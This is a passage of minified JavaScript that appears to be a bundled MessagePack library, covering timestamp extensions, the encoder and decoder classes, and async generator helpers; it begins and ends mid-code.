            var o = t.call(this, i) || this;
            return (
                Object.setPrototypeOf(o, Object.create(n.prototype)),
                Object.defineProperty(o, "name", {
                    configurable: !0,
                    enumerable: !1,
                    value: n.name,
                }),
                o
            );
        }
        return oa(n, t), n;
    })(Error),
    aa = -1,
    la = 4294967295,
    ca = 17179869183;

function ha(t) {
    var n = t.sec,
        i = t.nsec;
    if (n >= 0 && i >= 0 && n <= ca) {
        if (0 === i && n <= la) {
            var o = new Uint8Array(4),
                a = new DataView(o.buffer);
            return a.setUint32(0, n), o;
        }
        var o = new Uint8Array(8),
            a = new DataView(o.buffer);
        return (
            a.setUint32(0, (i << 2) | (3 & (n / 4294967296))),
            a.setUint32(4, 4294967295 & n),
            o
        );
    }
    var o = new Uint8Array(12),
        a = new DataView(o.buffer);
    return a.setUint32(0, i), Br(a, 4, n), o;
}

function fa(t) {
    var n = t.getTime(),
        i = Math.floor(n / 1e3),
        o = (n - 1e3 * i) * 1e6,
        a = Math.floor(o / 1e9);
    return {
        sec: i + a,
        nsec: o - 1e9 * a,
    };
}

function ua(t) {
    return t instanceof Date ? ha(fa(t)) : null;
}

function da(t) {
    var n = new DataView(t.buffer, t.byteOffset, t.byteLength);
    switch (t.byteLength) {
        case 4:
            var i = n.getUint32(0),
                o = 0;
            return {
                sec: i,
                nsec: o,
            };
        case 8:
            var a = n.getUint32(0),
                i = (3 & a) * 4294967296 + n.getUint32(4),
                o = a >>> 2;
            return {
                sec: i,
                nsec: o,
            };
        case 12:
            var i = zr(n, 4),
                o = n.getUint32(0);
            return {
                sec: i,
                nsec: o,
            };
        default:
            throw new Pe(
                "Unrecognized data size for timestamp (expected 4, 8, or 12): ".concat(
                    t.length
                )
            );
    }
}

function pa(t) {
    var n = da(t);
    return new Date(1e3 * n.sec + n.nsec / 1e6);
}
var ma = {
    type: aa,
    encode: ua,
    decode: pa,
},
    Fr = (function () {
        function t() {
            (this.builtInEncoders = []),
                (this.builtInDecoders = []),
                (this.encoders = []),
                (this.decoders = []),
                this.register(ma);
        }
        return (
            (t.prototype.register = function (t) {
                var n = t.type,
                    i = t.encode,
                    o = t.decode;
                if (n >= 0) (this.encoders[n] = i), (this.decoders[n] = o);
                else {
                    var a = 1 + n;
                    (this.builtInEncoders[a] = i), (this.builtInDecoders[a] = o);
                }
            }),
            (t.prototype.tryToEncode = function (t, n) {
                for (var i = 0; i < this.builtInEncoders.length; i++) {
                    var o = this.builtInEncoders[i];
                    if (null != o) {
                        var a = o(t, n);
                        if (null != a) {
                            var r = -1 - i;
                            return new si(r, a);
                        }
                    }
                }
                for (var i = 0; i < this.encoders.length; i++) {
                    var o = this.encoders[i];
                    if (null != o) {
                        var a = o(t, n);
                        if (null != a) {
                            var r = i;
                            return new si(r, a);
                        }
                    }
                }
                return t instanceof si ? t : null;
            }),
            (t.prototype.decode = function (t, n, i) {
                var o = n < 0 ? this.builtInDecoders[-1 - n] : this.decoders[n];
                return o ? o(t, n, i) : new si(n, t);
            }),
            (t.defaultCodec = new t()),
            t
        );
    })();

function gi(t) {
    return t instanceof Uint8Array
        ? t
    : ArrayBuffer.isView(t)
        ? new Uint8Array(t.buffer, t.byteOffset, t.byteLength)
    : t instanceof ArrayBuffer
        ? new Uint8Array(t)
    : Uint8Array.from(t);
}

function ga(t) {
    if (t instanceof ArrayBuffer) return new DataView(t);
    var n = gi(t);
    return new DataView(n.buffer, n.byteOffset, n.byteLength);
}
var ya = 100,
    wa = 2048,
    ka = (function () {
        function t(t, n, i, o, a, r, s, l) {
            void 0 === t && (t = Fr.defaultCodec),
                void 0 === n && (n = void 0),
                void 0 === i && (i = ya),
                void 0 === o && (o = wa),
                void 0 === a && (a = !1),
                void 0 === r && (r = !1),
                void 0 === s && (s = !1),
                void 0 === l && (l = !1),
                (this.extensionCodec = t),
                (this.context = n),
                (this.maxDepth = i),
                (this.initialBufferSize = o),
                (this.sortKeys = a),
                (this.forceFloat32 = r),
                (this.ignoreUndefined = s),
                (this.forceIntegerToFloat = l),
                (this.pos = 0),
                (this.view = new DataView(new ArrayBuffer(this.initialBufferSize))),
                (this.bytes = new Uint8Array(this.view.buffer));
        }
        return (
            (t.prototype.reinitializeState = function () {
                this.pos = 0;
            }),
            (t.prototype.encodeSharedRef = function (t) {
                return (
                    this.reinitializeState(),
                    this.doEncode(t, 1),
                    this.bytes.subarray(0, this.pos)
                );
            }),
            (t.prototype.encode = function (t) {
                return (
                    this.reinitializeState(),
                    this.doEncode(t, 1),
                    this.bytes.slice(0, this.pos)
                );
            }),
            (t.prototype.doEncode = function (t, n) {
                if (n > this.maxDepth)
                    throw Error("Too deep objects in depth ".concat(n));
                null == t
                    ? this.encodeNil()
                : "boolean" == typeof t
                    ? this.encodeBoolean(t)
                : "number" == typeof t
                    ? this.encodeNumber(t)
                : "string" == typeof t
                    ? this.encodeString(t)
                : this.encodeObject(t, n);
            }),
            (t.prototype.ensureBufferSizeToWrite = function (t) {
                var n = this.pos + t;
                this.view.byteLength < n && this.resizeBuffer(2 * n);
            }),
            (t.prototype.resizeBuffer = function (t) {
                var n = new ArrayBuffer(t),
                    i = new Uint8Array(n),
                    o = new DataView(n);
                i.set(this.bytes), (this.view = o), (this.bytes = i);
            }),
            (t.prototype.encodeNil = function () {
                this.writeU8(192);
            }),
            (t.prototype.encodeBoolean = function (t) {
                !1 === t ? this.writeU8(194) : this.writeU8(195);
            }),
            (t.prototype.encodeNumber = function (t) {
                Number.isSafeInteger(t) && !this.forceIntegerToFloat
                    ? t >= 0
                    ? t < 128
                    ? this.writeU8(t)
                : t < 256
                    ? (this.writeU8(204), this.writeU8(t))
                : t < 65536
                    ? (this.writeU8(205), this.writeU16(t))
                : t < 4294967296
                    ? (this.writeU8(206), this.writeU32(t))
                : (this.writeU8(207), this.writeU64(t))
                : t >= -32
                    ? this.writeU8(224 | (t + 32))
                : t >= -128
                    ? (this.writeU8(208), this.writeI8(t))
                : t >= -32768
                    ? (this.writeU8(209), this.writeI16(t))
                : t >= -2147483648
                    ? (this.writeU8(210), this.writeI32(t))
                : (this.writeU8(211), this.writeI64(t))
                : this.forceFloat32
                    ? (this.writeU8(202), this.writeF32(t))
                : (this.writeU8(203), this.writeF64(t));
            }),
            (t.prototype.writeStringHeader = function (t) {
                if (t < 32) this.writeU8(160 + t);
                else if (t < 256) this.writeU8(217), this.writeU8(t);
                else if (t < 65536) this.writeU8(218), this.writeU16(t);
                else if (t < 4294967296) this.writeU8(219), this.writeU32(t);
                else throw Error("Too long string: ".concat(t, " bytes in UTF-8"));
            }),
            (t.prototype.encodeString = function (t) {
                if (t.length > Zo) {
                    var n = Cs(t);
                    this.ensureBufferSizeToWrite(5 + n),
                        this.writeStringHeader(n),
                        ta(t, this.bytes, this.pos),
                        (this.pos += n);
                } else {
                    var n = Cs(t);
                    this.ensureBufferSizeToWrite(5 + n),
                        this.writeStringHeader(n),
                        Qo(t, this.bytes, this.pos),
                        (this.pos += n);
                }
            }),
            (t.prototype.encodeObject = function (t, n) {
                var i = this.extensionCodec.tryToEncode(t, this.context);
                if (null != i) this.encodeExtension(i);
                else if (Array.isArray(t)) this.encodeArray(t, n);
                else if (ArrayBuffer.isView(t)) this.encodeBinary(t);
                else if ("object" == typeof t) this.encodeMap(t, n);
                else
                    throw Error(
                        "Unrecognized object: ".concat(Object.prototype.toString.apply(t))
                    );
            }),
            (t.prototype.encodeBinary = function (t) {
                var n = t.byteLength;
                if (n < 256) this.writeU8(196), this.writeU8(n);
                else if (n < 65536) this.writeU8(197), this.writeU16(n);
                else if (n < 4294967296) this.writeU8(198), this.writeU32(n);
                else throw Error("Too large binary: ".concat(n));
                var i = gi(t);
                this.writeU8a(i);
            }),
            (t.prototype.encodeArray = function (t, n) {
                var i = t.length;
                if (i < 16) this.writeU8(144 + i);
                else if (i < 65536) this.writeU8(220), this.writeU16(i);
                else if (i < 4294967296) this.writeU8(221), this.writeU32(i);
                else throw Error("Too large array: ".concat(i));
                for (var o = 0, a = t; o < a.length; o++) {
                    var r = a[o];
                    this.doEncode(r, n + 1);
                }
            }),
            (t.prototype.countWithoutUndefined = function (t, n) {
                for (var i = 0, o = 0, a = n; o < a.length; o++)
                    void 0 !== t[a[o]] && i++;
                return i;
            }),
            (t.prototype.encodeMap = function (t, n) {
                var i = Object.keys(t);
                this.sortKeys && i.sort();
                var o = this.ignoreUndefined
                ? this.countWithoutUndefined(t, i)
                : i.length;
                if (o < 16) this.writeU8(128 + o);
                else if (o < 65536) this.writeU8(222), this.writeU16(o);
                else if (o < 4294967296) this.writeU8(223), this.writeU32(o);
                else throw Error("Too large map object: ".concat(o));
                for (var a = 0, r = i; a < r.length; a++) {
                    var s = r[a],
                        l = t[s];
                    (this.ignoreUndefined && void 0 === l) ||
                        (this.encodeString(s), this.doEncode(l, n + 1));
                }
            }),
            (t.prototype.encodeExtension = function (t) {
                var n = t.data.length;
                if (1 === n) this.writeU8(212);
                else if (2 === n) this.writeU8(213);
                else if (4 === n) this.writeU8(214);
                else if (8 === n) this.writeU8(215);
                else if (16 === n) this.writeU8(216);
                else if (n < 256) this.writeU8(199), this.writeU8(n);
                else if (n < 65536) this.writeU8(200), this.writeU16(n);
                else if (n < 4294967296) this.writeU8(201), this.writeU32(n);
                else throw Error("Too large extension object: ".concat(n));
                this.writeI8(t.type), this.writeU8a(t.data);
            }),
            (t.prototype.writeU8 = function (t) {
                this.ensureBufferSizeToWrite(1),
                    this.view.setUint8(this.pos, t),
                    this.pos++;
            }),
            (t.prototype.writeU8a = function (t) {
                var n = t.length;
                this.ensureBufferSizeToWrite(n),
                    this.bytes.set(t, this.pos),
                    (this.pos += n);
            }),
            (t.prototype.writeI8 = function (t) {
                this.ensureBufferSizeToWrite(1),
                    this.view.setInt8(this.pos, t),
                    this.pos++;
            }),
            (t.prototype.writeU16 = function (t) {
                this.ensureBufferSizeToWrite(2),
                    this.view.setUint16(this.pos, t),
                    (this.pos += 2);
            }),
            (t.prototype.writeI16 = function (t) {
                this.ensureBufferSizeToWrite(2),
                    this.view.setInt16(this.pos, t),
                    (this.pos += 2);
            }),
            (t.prototype.writeU32 = function (t) {
                this.ensureBufferSizeToWrite(4),
                    this.view.setUint32(this.pos, t),
                    (this.pos += 4);
            }),
            (t.prototype.writeI32 = function (t) {
                this.ensureBufferSizeToWrite(4),
                    this.view.setInt32(this.pos, t),
                    (this.pos += 4);
            }),
            (t.prototype.writeF32 = function (t) {
                this.ensureBufferSizeToWrite(4),
                    this.view.setFloat32(this.pos, t),
                    (this.pos += 4);
            }),
            (t.prototype.writeF64 = function (t) {
                this.ensureBufferSizeToWrite(8),
                    this.view.setFloat64(this.pos, t),
                    (this.pos += 8);
            }),
            (t.prototype.writeU64 = function (t) {
                this.ensureBufferSizeToWrite(8),
                    Ko(this.view, this.pos, t),
                    (this.pos += 8);
            }),
            (t.prototype.writeI64 = function (t) {
                this.ensureBufferSizeToWrite(8),
                    Br(this.view, this.pos, t),
                    (this.pos += 8);
            }),
            t
        );
    })();

function Ki(t) {
    return ""
        .concat(t < 0 ? "-" : "", "0x")
        .concat(Math.abs(t).toString(16).padStart(2, "0"));
}
var Ce,
    Ae,
    va = 16,
    xa = 16,
    ba = (function () {
        function t(t, n) {
            void 0 === t && (t = va),
                void 0 === n && (n = xa),
                (this.maxKeyLength = t),
                (this.maxLengthPerKey = n),
                (this.hit = 0),
                (this.miss = 0),
                (this.caches = []);
            for (var i = 0; i < this.maxKeyLength; i++) this.caches.push([]);
        }
        return (
            (t.prototype.canBeCached = function (t) {
                return t > 0 && t <= this.maxKeyLength;
            }),
            (t.prototype.find = function (t, n, i) {
                var o = this.caches[i - 1];
                e: for (var a = 0, r = o; a < r.length; a++) {
                    for (var s = r[a], l = s.bytes, c = 0; c < i; c++)
                        if (l[c] !== t[n + c]) continue e;
                    return s.str;
                }
                return null;
            }),
            (t.prototype.store = function (t, n) {
                var i = this.caches[t.length - 1],
                    o = {
                        bytes: t,
                        str: n,
                    };
                i.length >= this.maxLengthPerKey
                    ? (i[(Math.random() * i.length) | 0] = o)
                : i.push(o);
            }),
            (t.prototype.decode = function (t, n, i) {
                var o = this.find(t, n, i);
                if (null != o) return this.hit++, o;
                this.miss++;
                var a = Hr(t, n, i),
                    r = Uint8Array.prototype.slice.call(t, n, n + i);
                return this.store(r, a), a;
            }),
            t
        );
    })(),
    Sa =
    (globalThis && globalThis.__awaiter) ||
    function (t, n, i, o) {
        return new (i || (i = Promise))(function (a, r) {
            function s(t) {
                try {
                    c(o.next(t));
                } catch (n) {
                    r(n);
                }
            }

            function l(t) {
                try {
                    c(o.throw(t));
                } catch (n) {
                    r(n);
                }
            }

            function c(t) {
                var n;
                t.done
                    ? a(t.value)
                : ((n = t.value) instanceof i
                   ? n
                   : new i(function (t) {
                    t(n);
                })
                  ).then(s, l);
            }
            c((o = o.apply(t, n || [])).next());
        });
    },
    Ji =
    (globalThis && globalThis.__generator) ||
    function (t, n) {
        var i,
            o,
            a,
            r,
            s = {
                label: 0,
                sent: function () {
                    if (1 & a[0]) throw a[1];
                    return a[1];
                },
                trys: [],
                ops: [],
            };
        return (
            (r = {
                next: l(0),
                throw: l(1),
                return: l(2),
            }),
            "function" == typeof Symbol &&
            (r[Symbol.iterator] = function () {
                return this;
            }),
            r
        );

        function l(r) {
            return function (l) {
                return (function r(l) {
                    if (i) throw TypeError("Generator is already executing.");
                    for (; s; )
                        try {
                            if (
                                ((i = 1),
                                 o &&
                                 (a =
                                  2 & l[0]
                                  ? o.return
                                  : l[0]
                                  ? o.throw || ((a = o.return) && a.call(o), 0)
                                  : o.next) &&
                                 !(a = a.call(o, l[1])).done)
                            )
                                return a;
                            switch (((o = 0), a && (l = [2 & l[0], a.value]), l[0])) {
                                case 0:
                                case 1:
                                    a = l;
                                    break;
                                case 4:
                                    return (
                                        s.label++,
                                        {
                                            value: l[1],
                                            done: !1,
                                        }
                                    );
                                case 5:
                                    s.label++, (o = l[1]), (l = [0]);
                                    continue;
                                case 7:
                                    (l = s.ops.pop()), s.trys.pop();
                                    continue;
                                default:
                                    if (
                                        !(a = (a = s.trys).length > 0 && a[a.length - 1]) &&
                                        (6 === l[0] || 2 === l[0])
                                    ) {
                                        s = 0;
                                        continue;
                                    }
                                    if (3 === l[0] && (!a || (l[1] > a[0] && l[1] < a[3]))) {
                                        s.label = l[1];
                                        break;
                                    }
                                    if (6 === l[0] && s.label < a[1]) {
                                        (s.label = a[1]), (a = l);
                                        break;
                                    }
                                    if (a && s.label < a[2]) {
                                        (s.label = a[2]), s.ops.push(l);
                                        break;
                                    }
                                    a[2] && s.ops.pop(), s.trys.pop();
                                    continue;
                            }
                            l = n.call(t, s);
                        } catch (c) {
                            (l = [6, c]), (o = 0);
                        } finally {
                            i = a = 0;
                        }
                    if (5 & l[0]) throw l[1];
                    return {
                        value: l[0] ? l[1] : void 0,
                        done: !0,
                    };
                })([r, l]);
            };
        }
    },
    As =
    (globalThis && globalThis.__asyncValues) ||
    function (t) {
        if (!Symbol.asyncIterator)
            throw TypeError("Symbol.asyncIterator is not defined.");
        var n,
            i = t[Symbol.asyncIterator];
        return i
            ? i.call(t)
        : ((t =
            "function" == typeof __values ? __values(t) : t[Symbol.iterator]()),
           (n = {}),
           o("next"),
           o("throw"),
           o("return"),
           (n[Symbol.asyncIterator] = function () {
            return this;
        }),
           n);

        function o(i) {
            n[i] =
                t[i] &&
                function (n) {
                return new Promise(function (o, a) {
                    !(function t(n, i, o, a) {
                        Promise.resolve(a).then(function (t) {
                            n({
                                value: t,
                                done: o,
                            });
                        }, i);
                    })(o, a, (n = t[i](n)).done, n.value);
                });
            };
        }
    },
    St =
    (globalThis && globalThis.__await) ||
    function (t) {
        return this instanceof St ? ((this.v = t), this) : new St(t);
    },
    Ta =
    (globalThis && globalThis.__asyncGenerator) ||
    function (t, n, i) {
        if (!Symbol.asyncIterator)
            throw TypeError("Symbol.asyncIterator is not defined.");
        var o,
            a = i.apply(t, n || []),
            r = [];
        return (
            (o = {}),
            s("next"),
            s("throw"),
            s("return"),
            (o[Symbol.asyncIterator] = function () {
                return this;
            }),
            o
        );

        function s(t) {
            a[t] &&
                (o[t] = function (n) {
                return new Promise(function (i, o) {
                    r.push([t, n, i, o]) > 1 || l(t, n);
                });
            });
        }

        function l(t, n) {
            try {
                var i;
                (i = a[t](n)),
                    i.value instanceof St
                    ? Promise.resolve(i.value.v).then(c, d)
                : h(r[0][2], i);
            } catch (o) {
                h(r[0][3], o);
            }
        }

        function c(t) {
            l("next", t);
        }

        function d(t) {
            l("throw", t);
        }

        function h(t, n) {
            t(n), r.shift(), r.length && l(r[0][0], r[0][1]);
        }
    },
    Ia = function (t) {
        var n = typeof t;
        return "string" === n || "number" === n;
    },
    Dt = -1,
    es = new DataView(new ArrayBuffer(0)),
    Ma = new Uint8Array(es.buffer),
    Cn = (function () {
        try {
            es.getInt8(0);
        } catch (t) {
            return t.constructor;
        }
        throw Error("never reached");
    })(),
    Ds = new Cn("Insufficient data"),
    Ea = new ba(),
    Pa = (function () {
        function t(t, n, i, o, a, r, s, l) {
            void 0 === t && (t = Fr.defaultCodec),
                void 0 === n && (n = void 0),
                void 0 === i && (i = Ke),
                void 0 === o && (o = Ke),
                void 0 === a && (a = Ke),
                void 0 === r && (r = Ke),
                void 0 === s && (s = Ke),
                void 0 === l && (l = Ea),
                (this.extensionCodec = t),
                (this.context = n),
                (this.maxStrLength = i),
                (this.maxBinLength = o),
                (this.maxArrayLength = a),
                (this.maxMapLength = r),
                (this.maxExtLength = s),
                (this.keyDecoder = l),
                (this.totalPos = 0),
                (this.pos = 0),
                (this.view = es),
                (this.bytes = Ma),
                (this.headByte = Dt),
                (this.stack = []);
        }
        return (
            (t.prototype.reinitializeState = function () {
                (this.totalPos = 0), (this.headByte = Dt), (this.stack.length = 0);
            }),
            (t.prototype.setBuffer = function (t) {
                (this.bytes = gi(t)), (this.view = ga(this.bytes)), (this.pos = 0);
            }),
            (t.prototype.appendBuffer = function (t) {
                if (this.headByte !== Dt || this.hasRemaining(1)) {
                    var n = this.bytes.subarray(this.pos),
                        i = gi(t),
                        o = new Uint8Array(n.length + i.length);
                    o.set(n), o.set(i, n.length), this.setBuffer(o);
                } else this.setBuffer(t);
            }),
            (t.prototype.hasRemaining = function (t) {
                return this.view.byteLength - this.pos >= t;
            }),
            (t.prototype.createExtraByteError = function (t) {
                var n = this.view,
                    i = this.pos;
                return RangeError(
                    "Extra "
                    .concat(n.byteLength - i, " of ")
                    .concat(n.byteLength, " byte(s) found at buffer[")
                    .concat(t, "]")
                );
            }),
            (t.prototype.decode = function (t) {
                this.reinitializeState(), this.setBuffer(t);
                var n = this.doDecodeSync();
                if (this.hasRemaining(1)) throw this.createExtraByteError(this.pos);
                return n;
            }),
            (t.prototype.decodeMulti = function (t) {
                return Ji(this, function (n) {
                    switch (n.label) {
                        case 0:
                            this.reinitializeState(), this.setBuffer(t), (n.label = 1);
                        case 1:
                            return this.hasRemaining(1) ? [4, this.doDecodeSync()] : [3, 3];
                        case 2:
                            return n.sent(), [3, 1];
                        case 3:
                            return [2];
                    }
                });
            }),
            (t.prototype.decodeAsync = function (t) {
                var n, i, o, a;
                return Sa(this, void 0, void 0, function () {
                    var r, s, l, c, d, h, u, p;
                    return Ji(this, function (f) {
                        switch (f.label) {
                            case 0:
                                (r = !1), (f.label = 1);
                            case 1:
                                f.trys.push([1, 6, 7, 12]), (n = As(t)), (f.label = 2);
                            case 2:
                                return [4, n.next()];
                            case 3:
                                if ((i = f.sent()).done) return [3, 5];
                                if (((l = i.value), r))
                                    throw this.createExtraByteError(this.totalPos);
                                this.appendBuffer(l);
                                try {
                                    (s = this.doDecodeSync()), (r = !0);
                                } catch ($) {
                                    if (!($ instanceof Cn)) throw $;
                                }
                                (this.totalPos += this.pos), (f.label = 4);
                            case 4:
                                return [3, 2];
                            case 5:
                                return [3, 12];
                            case 6:
                                return (
                                    (o = {
                                        error: (c = f.sent()),
                                    }),
                                    [3, 12]
                                );
                            case 7:
                                return (
                                    f.trys.push([7, , 10, 11]),
                                    i && !i.done && (a = n.return) ? [4, a.call(n)] : [3, 9]
                                );
                            case 8:
                                f.sent(), (f.label = 9);
                            case 9:
                                return [3, 11];
                            case 10:
                                if (o) throw o.error;
                                return [7];
                            case 11:
                                return [7];
                            case 12:
                                if (r) {
                                    if (this.hasRemaining(1))
                                        throw this.createExtraByteError(this.totalPos);
                                    return [2, s];
                                }
                                throw (
                                    ((d = this),
                                     (h = d.headByte),
                                     (u = d.pos),
                                     (p = d.totalPos),
                                     RangeError(
                                        "Insufficient data in parsing "
                                        .concat(Ki(h), " at ")
                                        .concat(p, " (")
                                        .concat(u, " in the current buffer)")
                                    ))
                                );
                        }
                    });
                });
            }),
            (t.prototype.decodeArrayStream = function (t) {
                return this.decodeMultiAsync(t, !0);
            }),
            (t.prototype.decodeStream = function (t) {
                return this.decodeMultiAsync(t, !1);
            }),
            (t.prototype.decodeMultiAsync = function (t, n) {
                return Ta(this, arguments, function () {
                    var i, o, a, r, s, l, c, d, h;
                    return Ji(this, function (u) {
                        switch (u.label) {
                            case 0:
                                (i = n), (o = -1), (u.label = 1);
                            case 1:
                                u.trys.push([1, 13, 14, 19]), (a = As(t)), (u.label = 2);
                            case 2:
                                return [4, St(a.next())];
                            case 3:
                                if ((r = u.sent()).done) return [3, 12];
                                if (((s = r.value), n && 0 === o))
                                    throw this.createExtraByteError(this.totalPos);
                                this.appendBuffer(s),
                                    i && ((o = this.readArraySize()), (i = !1), this.complete()),
                                    (u.label = 4);
                            case 4:
                                u.trys.push([4, 9, , 10]), (u.label = 5);
                            case 5:
                                return [4, St(this.doDecodeSync())];
                            case 6:
                                return [4, u.sent()];
                            case 7:
                                return u.sent(), 0 == --o ? [3, 8] : [3, 5];
                            case 8:
                                return [3, 10];
                            case 9:
                                if (!((l = u.sent()) instanceof Cn)) throw l;
                                return [3, 10];
                            case 10:
                                (this.totalPos += this.pos), (u.label = 11);
                            case 11:
                                return [3, 2];
                            case 12:
                                return [3, 19];
                            case 13:
                                return (
                                    (d = {
                                        error: (c = u.sent()),
                                    }),
                                    [3, 19]
                                );
                            case 14:
                                return (
                                    u.trys.push([14, , 17, 18]),
                                    r && !r.done && (h = a.return) ? [4, St(h.call(a))] : [3, 16]
                                );
                            case 15:
                                u.sent(), (u.label = 16);
                            case 16:
                                return [3, 18];
                            case 17:
                                if (d) throw d.error;
                                return [7];
                            case 18:
                                return [7];
                            case 19:
                                return [2];
                        }
                    });
                });
            }),
            (t.prototype.doDecodeSync = function () {
                e: for (;;) {
                    var t = this.readHeadByte(),
                        n = void 0;
                    if (t >= 224) n = t - 256;
                    else if (t < 192) {
                        if (t < 128) n = t;
                        else if (t < 144) {
                            var i = t - 128;
                            if (0 !== i) {
                                this.pushMapState(i), this.complete();
                                continue e;
                            }
                            n = {};
                        } else if (t < 160) {
                            var i = t - 144;
                            if (0 !== i) {
                                this.pushArrayState(i), this.complete();
                                continue e;
                            }
                            n = [];
                        } else {
                            var o = t - 160;
                            n = this.decodeUtf8String(o, 0);
                        }
                    } else if (192 === t) n = null;
                    else if (194 === t) n = !1;
                    else if (195 === t) n = !0;
                    else if (202 === t) n = this.readF32();
                    else if (203 === t) n = this.readF64();
                    else if (204 === t) n = this.readU8();
                    else if (205 === t) n = this.readU16();
                    else if (206 === t) n = this.readU32();
                    else if (207 === t) n = this.readU64();
                    else if (208 === t) n = this.readI8();
                    else if (209 === t) n = this.readI16();
                    else if (210 === t) n = this.readI32();
                    else if (211 === t) n = this.readI64();
                    else if (217 === t) {
                        var o = this.lookU8();
                        n = this.decodeUtf8String(o, 1);
                    } else if (218 === t) {
                        var o = this.lookU16();
                        n = this.decodeUtf8String(o, 2);
                    } else if (219 === t) {
                        var o = this.lookU32();
                        n = this.decodeUtf8String(o, 4);
                    } else if (220 === t) {
                        var i = this.readU16();
                        if (0 !== i) {
                            this.pushArrayState(i), this.complete();
                            continue e;
                        }
                        n = [];
                    } else if (221 === t) {
                        var i = this.readU32();
                        if (0 !== i) {
                            this.pushArrayState(i), this.complete();
                            continue e;
                        }
                        n = [];
                    } else if (222 === t) {
                        var i = this.readU16();
                        if (0 !== i) {
                            this.pushMapState(i), this.complete();
                            continue e;
                        }
                        n = {};
                    } else if (223 === t) {
                        var i = this.readU32();
                        if (0 !== i) {
                            this.pushMapState(i), this.complete();
                            continue e;
                        }
                        n = {};
                    } else if (196 === t) {
                        var i = this.lookU8();
                        n = this.decodeBinary(i, 1);
                    } else if (197 === t) {
                        var i = this.lookU16();
                        n = this.decodeBinary(i, 2);
                    } else if (198 === t) {
                        var i = this.lookU32();
                        n = this.decodeBinary(i, 4);
                    } else if (212 === t) n = this.decodeExtension(1, 0);
                    else if (213 === t) n = this.decodeExtension(2, 0);
                    else if (214 === t) n = this.decodeExtension(4, 0);
                    else if (215 === t) n = this.decodeExtension(8, 0);
                    else if (216 === t) n = this.decodeExtension(16, 0);
                    else if (199 === t) {
                        var i = this.lookU8();
                        n = this.decodeExtension(i, 1);
                    } else if (200 === t) {
                        var i = this.lookU16();
                        n = this.decodeExtension(i, 2);
                    } else if (201 === t) {
                        var i = this.lookU32();
                        n = this.decodeExtension(i, 4);
                    } else throw new Pe("Unrecognized type byte: ".concat(Ki(t)));
                    this.complete();
                    for (var a = this.stack; a.length > 0; ) {
                        var r = a[a.length - 1];
                        if (0 === r.type) {
                            if (
                                ((r.array[r.position] = n), r.position++, r.position === r.size)
                            )
                                a.pop(), (n = r.array);
                            else continue e;
                        } else if (1 === r.type) {
                            if (!Ia(n))
                                throw new Pe(
                                    "The type of key must be string or number but " + typeof n
                                );
                            if ("__proto__" === n)
                                throw new Pe("The key __proto__ is not allowed");
                            (r.key = n), (r.type = 2);
                            continue e;
                        } else if (
                            ((r.map[r.key] = n), r.readCount++, r.readCount === r.size)
                        )
                            a.pop(), (n = r.map);
                        else {
                            (r.key = null), (r.type = 1);
                            continue e;
                        }
                    }
                    return n;
                }
            }),
            (t.prototype.readHeadByte = function () {
                return (
                    this.headByte === Dt && (this.headByte = this.readU8()), this.headByte
                );
            }),
            (t.prototype.complete = function () {
                this.headByte = Dt;
            }),
            (t.prototype.readArraySize = function () {
                var t = this.readHeadByte();
                switch (t) {
                    case 220:
                        return this.readU16();
                    case 221:
                        return this.readU32();
                    default:
                        if (t < 160) return t - 144;
                        throw new Pe("Unrecognized array type byte: ".concat(Ki(t)));
                }
            }),
            (t.prototype.pushMapState = function (t) {
                if (t > this.maxMapLength)
                    throw new Pe(
                        "Max length exceeded: map length ("
                        .concat(t, ") > maxMapLengthLength (")
                        .concat(this.maxMapLength, ")")
                    );
                this.stack.push({
                    type: 1,
                    size: t,
                    key: null,
                    readCount: 0,
                    map: {},
                });
            }),
            (t.prototype.pushArrayState = function (t) {
                if (t > this.maxArrayLength)
                    throw new Pe(
                        "Max length exceeded: array length ("
                        .concat(t, ") > maxArrayLength (")
                        .concat(this.maxArrayLength, ")")
                    );
                this.stack.push({
                    type: 0,
                    size: t,
                    array: Array(t),
                    position: 0,
                });
            }),
            (t.prototype.decodeUtf8String = function (t, n) {
                if (t > this.maxStrLength)
                    throw new Pe(
                        "Max length exceeded: UTF-8 byte length ("
                        .concat(t, ") > maxStrLength (")
                        .concat(this.maxStrLength, ")")
                    );
                if (this.bytes.byteLength < this.pos + n + t) throw Ds;
                var i,
                    o,
                    a = this.pos + n;
                return (
                    (o =
                     this.stateIsMapKey() &&
                     !(null === (i = this.keyDecoder) || void 0 === i) &&
                     i.canBeCached(t)
                     ? this.keyDecoder.decode(this.bytes, a, t)
                     : t > sa
                     ? ra(this.bytes, a, t)
                     : Hr(this.bytes, a, t)),
                    (this.pos += n + t),
                    o
                );
            }),
            (t.prototype.stateIsMapKey = function () {
                return (
                    !!(this.stack.length > 0) &&
                    1 === this.stack[this.stack.length - 1].type
                );
            }),
            (t.prototype.decodeBinary = function (t, n) {
                if (t > this.maxBinLength)
                    throw new Pe(
                        "Max length exceeded: bin length ("
                        .concat(t, ") > maxBinLength (")
                        .concat(this.maxBinLength, ")")
                    );
                if (!this.hasRemaining(t + n)) throw Ds;
                var i = this.pos + n,
                    o = this.bytes.subarray(i, i + t);
                return (this.pos += n + t), o;
            }),
            (t.prototype.decodeExtension = function (t, n) {
                if (t > this.maxExtLength)
                    throw new Pe(
                        "Max length exceeded: ext length ("
                        .concat(t, ") > maxExtLength (")
                        .concat(this.maxExtLength, ")")
                    );
                var i = this.view.getInt8(this.pos + n),
                    o = this.decodeBinary(t, n + 1);
                return this.extensionCodec.decode(o, i, this.context);
            }),
            (t.prototype.lookU8 = function () {
                return this.view.getUint8(this.pos);
            }),
            (t.prototype.lookU16 = function () {
                return this.view.getUint16(this.pos);
            }),
            (t.prototype.lookU32 = function () {
                return this.view.getUint32(this.pos);
            }),
            (t.prototype.readU8 = function () {
                var t = this.view.getUint8(this.pos);
                return this.pos++, t;
            }),
            (t.prototype.readI8 = function () {
                var t = this.view.getInt8(this.pos);
                return this.pos++, t;
            }),
            (t.prototype.readU16 = function () {
                var t = this.view.getUint16(this.pos);
                return (this.pos += 2), t;
            }),
            (t.prototype.readI16 = function () {
                var t = this.view.getInt16(this.pos);
                return (this.pos += 2), t;
            }),
            (t.prototype.readU32 = function () {
                var t = this.view.getUint32(this.pos);
                return (this.pos += 4), t;
            }),
            (t.prototype.readI32 = function () {
                var t = this.view.getInt32(this.pos);
                return (this.pos += 4), t;
            }),
            (t.prototype.readU64 = function () {
                var t = Jo(this.view, this.pos);
                return (this.pos += 8), t;
            }),
            (t.prototype.readI64 = function () {
                var t = zr(this.view, this.pos);
                return (this.pos += 8), t;
            }),
            (t.prototype.readF32 = function () {
